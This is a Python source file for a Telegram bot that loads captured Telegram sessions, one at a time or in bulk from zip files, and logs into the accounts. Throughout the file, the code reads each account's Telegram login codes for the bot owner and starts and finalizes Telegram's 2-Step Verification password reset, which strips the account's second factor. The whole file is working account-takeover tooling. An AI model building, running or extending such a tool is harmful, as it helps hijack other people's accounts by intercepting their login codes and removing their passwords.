import asyncio
import logging
import os
import re
import tempfile
import uuid
from datetime import datetime, timezone

from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import BotCommand, InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.fsm.storage.memory import MemoryStorage

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.account import ResetPasswordRequest
from telethon.tl.types.account import ResetPasswordOk, ResetPasswordFailedWait, ResetPasswordRequestedWait

import storage
from config import BOT_TOKEN, OWNER_ID, API_ID, API_HASH
from session_utils import session_string_from_file, session_string_from_pyrogram_string, extract_zip_sessions

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# In-memory account registry: account_id -> {"session": str, "phone": str}
# Nothing here is ever logged out / destroyed — this bot only ever reads.
ACCOUNTS = {}

# Which of the two separate entry points ("📤 Read OTP" vs "🔓 Password Reset")
# the NEXT session upload belongs to. Set only by tapping one of those two
# buttons — single-owner bot, so a plain global is enough, no FSM needed.
CURRENT_MODE = "otp"  # "otp" | "reset"

# In-memory batch state for the current .zip run (single-owner bot, so one
# global dict is enough — no multi-user concurrency to worry about).
BATCH = {
    "items": [],     # list of {"name","session","phone","status","error","account_id"}
    "index": -1,
    "success": 0,
    "failed": 0,
    "active": False,
}

# Telegram's official "Login code" messages come from this service user id.
TELEGRAM_SERVICE_ID = 777000
OTP_CODE_RE = re.compile(r"\b(\d{4,7})\b")


def is_owner(user_id: int) -> bool:
    return OWNER_ID != 0 and user_id == OWNER_ID


def gen_account_id() -> str:
    return uuid.uuid4().hex[:10]


def otp_kb(account_id: str, with_next: bool = False) -> InlineKeyboardMarkup:
    rows = [[InlineKeyboardButton(text="🔑 Check OTP", callback_data=f"checkotp_{account_id}")]]
    if with_next:
        rows.append([InlineKeyboardButton(text="➡️ Next", callback_data="batch_next")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def reset_kb(account_id: str, with_next: bool = False) -> InlineKeyboardMarkup:
    rows = [[InlineKeyboardButton(text="🔓 Request Password Reset", callback_data=f"resetpw_{account_id}")]]
    if with_next:
        rows.append([InlineKeyboardButton(text="➡️ Next", callback_data="batch_next")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def format_remaining(until_date_iso: str) -> str:
    until = datetime.fromisoformat(until_date_iso)
    if until.tzinfo is None:
        until = until.replace(tzinfo=timezone.utc)
    delta = until - datetime.now(timezone.utc)
    total_seconds = delta.total_seconds()
    if total_seconds <= 0:
        return "ready now ✅"
    days = int(total_seconds // 86400)
    hours = int((total_seconds % 86400) // 3600)
    return f"{days}d {hours}h remaining"


async def request_password_reset(session_string: str):
    """Triggers (or, after the wait period, finalizes) Telegram's official
    'Forgot password? -> Reset' 2-Step Verification recovery flow — the
    exact same thing the app itself does, just via Telethon.

    Returns (result_dict, error). result_dict["status"] is one of:
      "ok"          -> no password set / password has just been removed
      "waiting"     -> reset requested, result_dict["until_date"] is a
                       timezone-aware datetime for when it becomes final
      "failed_wait" -> a reset was requested too recently, must wait
                       until result_dict["retry_date"] before asking again
    """
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    try:
        await client.connect()
        result = await client(ResetPasswordRequest())
        if isinstance(result, ResetPasswordOk):
            return {"status": "ok"}, None
        if isinstance(result, ResetPasswordRequestedWait):
            return {"status": "waiting", "until_date": result.until_date}, None
        if isinstance(result, ResetPasswordFailedWait):
            return {"status": "failed_wait", "retry_date": result.retry_date}, None
        return {"status": "unknown", "raw": result}, None
    except Exception as e:
        return None, str(e)
    finally:
        await client.disconnect()


async def login_and_get_phone(session_string: str):
    """Connects on demand, fetches the phone number, disconnects.
    Never calls log_out() — a failed/expired session is just reported,
    never destroyed. Returns (phone, error)."""
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return None, "Session is not authorized (logged out or invalid)."
        me = await client.get_me()
        phone = f"+{me.phone}" if me.phone else "Unknown"
        return phone, None
    except Exception as e:
        return None, str(e)
    finally:
        await client.disconnect()


async def resolve_and_login_text(raw_text: str, work_dir: str):
    """Tries the pasted text as a Telethon session string first. If login
    fails (e.g. it was actually a Pyrogram string and Telethon can't make
    sense of the bytes), automatically converts it as Pyrogram and retries.
    Returns (session_string, phone, error)."""
    phone, error = await login_and_get_phone(raw_text)
    if not error:
        return raw_text, phone, None

    # Fallback: maybe this was a Pyrogram string, not Telethon.
    try:
        converted = session_string_from_pyrogram_string(raw_text, work_dir)
    except Exception as conv_err:
        return None, None, f"Not a valid Telethon session ({error}). Tried as Pyrogram too: {conv_err}"

    phone2, error2 = await login_and_get_phone(converted)
    if error2:
        return None, None, f"Converted from Pyrogram format but still couldn't log in: {error2}"
    return converted, phone2, None


# ---------------------------------------------------------------------------
# /start
# ---------------------------------------------------------------------------

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if not is_owner(message.from_user.id):
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📤 Read OTP", callback_data="mode_otp")],
        [InlineKeyboardButton(text="🔓 Password Reset", callback_data="mode_reset")],
    ])
    await message.answer(
        "👋 Welcome!\n\n"
        "Choose what you want to do, then send a session as:\n"
        "• a session string\n"
        "• a .session file\n"
        "• a .zip containing multiple sessions",
        reply_markup=kb
    )


@dp.callback_query(F.data == "mode_otp")
async def set_mode_otp(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        return
    global CURRENT_MODE
    CURRENT_MODE = "otp"
    await callback.message.edit_text("📤 Send the session now — as text, a .session file, or a .zip. I'll read the OTP for it on demand.")
    await callback.answer()


@dp.callback_query(F.data == "mode_reset")
async def set_mode_reset(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        return
    global CURRENT_MODE
    CURRENT_MODE = "reset"
    await callback.message.edit_text("🔓 Send the session now — as text, a .session file, or a .zip. I'll request a 2-Step password reset for it.")
    await callback.answer()


# ---------------------------------------------------------------------------
# Single session string
# ---------------------------------------------------------------------------

async def process_single_session(message: types.Message, session_string: str, phone: str, status: types.Message):
    """Shared final step once a single session is logged in — branches on
    CURRENT_MODE to either hand back an OTP-check button, or go straight
    into requesting a password reset for it."""
    if CURRENT_MODE == "reset":
        await status.edit_text(f"✅ Logged in — `{phone}`\n\n🔍 Requesting password reset...", parse_mode="Markdown")
        await trigger_reset_and_report(message.chat.id, phone, session_string, status)
        return

    account_id = gen_account_id()
    ACCOUNTS[account_id] = {"session": session_string, "phone": phone}
    await status.edit_text(
        f"✅ Logged in!\n\n📱 Number: `{phone}`",
        parse_mode="Markdown",
        reply_markup=otp_kb(account_id)
    )


@dp.message(F.text & ~F.text.startswith("/"))
async def handle_session_text(message: types.Message):
    if not is_owner(message.from_user.id):
        return
    raw_text = message.text.strip()
    if len(raw_text) < 20:
        return  # clearly not a session string, ignore quietly

    status = await message.answer("🔍 Logging in, please wait...")
    work_dir = tempfile.mkdtemp(prefix="otp_session_")
    session_string, phone, error = await resolve_and_login_text(raw_text, work_dir)
    if error:
        await status.edit_text(f"❌ Could not log in with this session.\n\nReason: {error}")
        return

    await process_single_session(message, session_string, phone, status)


# ---------------------------------------------------------------------------
# .session file / .zip
# ---------------------------------------------------------------------------

@dp.message(F.document)
async def handle_session_document(message: types.Message):
    if not is_owner(message.from_user.id):
        return

    doc = message.document
    file_name = doc.file_name or "upload"
    work_dir = tempfile.mkdtemp(prefix="otp_session_")
    local_path = os.path.join(work_dir, file_name)

    tg_file = await bot.get_file(doc.file_id)
    await bot.download_file(tg_file.file_path, local_path)

    if file_name.lower().endswith(".zip"):
        await handle_zip_upload(message, local_path, work_dir)
        return

    if file_name.lower().endswith(".session"):
        status = await message.answer("🔍 Reading session file, please wait...")
        try:
            session_string = session_string_from_file(local_path, work_dir)
        except Exception as e:
            await status.edit_text(f"❌ Session invalid.\n\nReason: {e}")
            return

        phone, error = await login_and_get_phone(session_string)
        if error:
            await status.edit_text(f"❌ Could not log in with this session.\n\nReason: {error}")
            return

        await process_single_session(message, session_string, phone, status)
        return

    await message.answer("❌ Unsupported file type. Send a session string, a .session file, or a .zip.")


async def handle_zip_upload(message: types.Message, zip_path: str, work_dir: str):
    status = await message.answer("🔍 Reading .zip, please wait...")
    raw_items = extract_zip_sessions(zip_path, work_dir)
    total = len(raw_items)

    items = []
    for item in raw_items:
        if item["error"]:
            items.append({**item, "phone": None, "status": "invalid"})
            continue
        phone, login_error = await login_and_get_phone(item["session"])
        if login_error:
            items.append({**item, "phone": None, "status": "login_failed", "error": login_error})
        else:
            items.append({**item, "phone": phone, "status": "ok"})

    valid_count = sum(1 for i in items if i["status"] == "ok")

    BATCH["items"] = items
    BATCH["index"] = -1
    BATCH["success"] = 0
    BATCH["failed"] = total - valid_count
    BATCH["active"] = True
    BATCH["mode"] = CURRENT_MODE  # locks this batch to whichever mode was active at upload time

    await status.edit_text(f"📦 Found **{total}** session(s) in the zip — **{valid_count}** valid.", parse_mode="Markdown")
    await send_next_batch_item(message.chat.id)


async def send_next_batch_item(chat_id: int):
    items = BATCH["items"]
    idx = BATCH["index"] + 1

    # Skip invalid / login-failed entries automatically (already counted in
    # BATCH["failed"]) — only valid, logged-in accounts get shown.
    while idx < len(items) and items[idx]["status"] != "ok":
        idx += 1
    BATCH["index"] = idx

    if idx >= len(items):
        BATCH["active"] = False
        await bot.send_message(
            chat_id,
            f"🏁 All done!\n\n✅ Successful: {BATCH['success']}\n❌ Failed: {BATCH['failed']}"
        )
        return

    item = items[idx]
    account_id = gen_account_id()
    ACCOUNTS[account_id] = {"session": item["session"], "phone": item["phone"]}
    item["account_id"] = account_id
    BATCH["success"] += 1

    has_more = any(i["status"] == "ok" for i in items[idx + 1:])
    kb = reset_kb(account_id, with_next=has_more) if BATCH.get("mode") == "reset" else otp_kb(account_id, with_next=has_more)
    await bot.send_message(
        chat_id,
        f"📱 Number: `{item['phone']}`",
        parse_mode="Markdown",
        reply_markup=kb
    )


@dp.callback_query(F.data == "batch_next")
async def batch_next_handler(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        return
    await callback.answer()
    if not BATCH["active"]:
        await callback.message.answer("ℹ️ No active batch right now.")
        return
    await send_next_batch_item(callback.message.chat.id)


# ---------------------------------------------------------------------------
# Check OTP — on-demand only, never auto / background
# ---------------------------------------------------------------------------

@dp.callback_query(F.data.startswith("checkotp_"))
async def check_otp_handler(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        return

    account_id = callback.data.split("_", 1)[1]
    account = ACCOUNTS.get(account_id)
    if not account:
        await callback.answer("❌ This session is no longer available.", show_alert=True)
        return

    await callback.answer("🔍 Checking...")

    client = TelegramClient(StringSession(account["session"]), API_ID, API_HASH)
    try:
        await client.connect()
        messages = await client.get_messages(TELEGRAM_SERVICE_ID, limit=5)
        otp = None
        for m in messages:
            if m.text:
                match = OTP_CODE_RE.search(m.text)
                if match:
                    otp = match.group(1)
                    break

        if otp:
            await callback.message.reply(otp)
        else:
            await callback.message.reply("❌ No recent OTP found.")
    except Exception as e:
        # Reporting only — the session itself is left completely untouched.
        await callback.message.reply(f"❌ Could not fetch OTP.\n\nReason: {e}")
    finally:
        # Only disconnects THIS on-demand connection. Never client.log_out() —
        # the account's session must survive a failed check.
        await client.disconnect()


# ---------------------------------------------------------------------------
# 2-Step Verification password reset (Telegram's own "Forgot password?" flow)
# ---------------------------------------------------------------------------

async def trigger_reset_and_report(chat_id: int, phone: str, session_string: str, status_msg: types.Message = None):
    """Runs request_password_reset and sends/edits a message with the
    outcome — shared by the single-session reset flow, the zip-batch reset
    flow, and the per-account resetpw_ button."""
    result, error = await request_password_reset(session_string)

    if error:
        text = f"❌ Could not request a password reset for `{phone}`.\n\nReason: {error}"
    elif result["status"] == "ok":
        text = f"✅ No 2-Step password is set on `{phone}` (or it was already removed)."
    elif result["status"] == "failed_wait":
        text = (
            f"⚠️ A reset was already requested recently for `{phone}`. "
            f"Try again after {result['retry_date']}."
        )
    elif result["status"] == "waiting":
        entry_id = f"reset_{uuid.uuid4().hex[:10]}"
        until_iso = result["until_date"].isoformat()
        storage.add_pending(entry_id, phone, session_string, until_iso)
        text = (
            f"🔓 Password reset requested for `{phone}`!\n\n"
            f"⏳ {format_remaining(until_iso)}\n\n"
            f"I'll message you here the moment it's ready to finalize — or check anytime with /pending.\n\n"
            f"Nothing happens automatically before then, and the request never touches the session itself."
        )
    else:
        text = f"⚠️ Unexpected response from Telegram: {result}"

    if status_msg:
        await status_msg.edit_text(text, parse_mode="Markdown")
    else:
        await bot.send_message(chat_id, text, parse_mode="Markdown")


@dp.callback_query(F.data.startswith("resetpw_"))
async def request_reset_handler(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        return
    account_id = callback.data.split("_", 1)[1]
    account = ACCOUNTS.get(account_id)
    if not account:
        await callback.answer("❌ This session is no longer available.", show_alert=True)
        return

    await callback.answer("🔍 Requesting...")
    await trigger_reset_and_report(callback.message.chat.id, account["phone"], account["session"])


@dp.callback_query(F.data.startswith("finalize_"))
async def finalize_reset_handler(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        return
    entry_id = callback.data.split("_", 1)[1]
    entry = storage.get_pending(entry_id)
    if not entry:
        await callback.answer("❌ Not found — maybe already finalized.", show_alert=True)
        return

    await callback.answer("🔍 Checking with Telegram...")
    result, error = await request_password_reset(entry["session"])
    if error:
        await callback.message.reply(f"❌ Could not finalize.\n\nReason: {error}")
        return

    if result["status"] == "ok":
        storage.remove_pending(entry_id)
        await callback.message.reply(
            f"✅ 2-Step password has been removed for `{entry['phone']}`!\n\n"
            f"You can now log in with just the OTP, or set a new password from the account's own Settings.",
            parse_mode="Markdown"
        )
        return

    if result["status"] == "waiting":
        until_iso = result["until_date"].isoformat()
        storage.update_until_date(entry_id, until_iso)
        await callback.message.reply(f"⏳ Not ready yet for `{entry['phone']}`.\n\n{format_remaining(until_iso)}", parse_mode="Markdown")
        return

    await callback.message.reply(f"⚠️ Unexpected response: {result}")


@dp.message(Command("pending"))
async def cmd_pending(message: types.Message):
    if not is_owner(message.from_user.id):
        return
    pending = storage.get_all_pending()
    if not pending:
        await message.answer("ℹ️ No pending password-reset requests right now.")
        return

    for entry_id, entry in pending.items():
        remaining = format_remaining(entry["until_date"])
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔁 Try Finalize Now", callback_data=f"finalize_{entry_id}")]
        ])
        await message.answer(f"📱 `{entry['phone']}`\n⏳ {remaining}", parse_mode="Markdown", reply_markup=kb)


async def reset_watcher():
    """Background loop: every hour, checks pending reset requests and — only
    when the 7-day wait is actually over — sends the owner a notification
    with a button to finalize. It never finalizes on its own; removing the
    password always needs an explicit tap, same as every other action here."""
    while True:
        try:
            pending = storage.get_all_pending()
            now = datetime.now(timezone.utc)
            for entry_id, entry in pending.items():
                if entry.get("notified_ready"):
                    continue
                until = datetime.fromisoformat(entry["until_date"])
                if until.tzinfo is None:
                    until = until.replace(tzinfo=timezone.utc)
                if now >= until:
                    kb = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="✅ Finalize - Remove Password Now", callback_data=f"finalize_{entry_id}")]
                    ])
                    await bot.send_message(
                        OWNER_ID,
                        f"⏰ Ready! The 2-Step password for `{entry['phone']}` can now be removed.\n\n"
                        f"Tap below whenever you want to finalize — this won't happen on its own.",
                        parse_mode="Markdown",
                        reply_markup=kb
                    )
                    storage.mark_notified(entry_id)
        except Exception:
            logging.exception("reset_watcher loop error")
        await asyncio.sleep(3600)


# ---------------------------------------------------------------------------
# Bot command menu (the "/" menu every bot shows)
# ---------------------------------------------------------------------------

async def setup_commands():
    await bot.set_my_commands([
        BotCommand(command="start", description="Start the bot / send a session"),
        BotCommand(command="pending", description="View pending password-reset requests"),
    ])


async def main():
    await setup_commands()
    asyncio.create_task(reset_watcher())
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
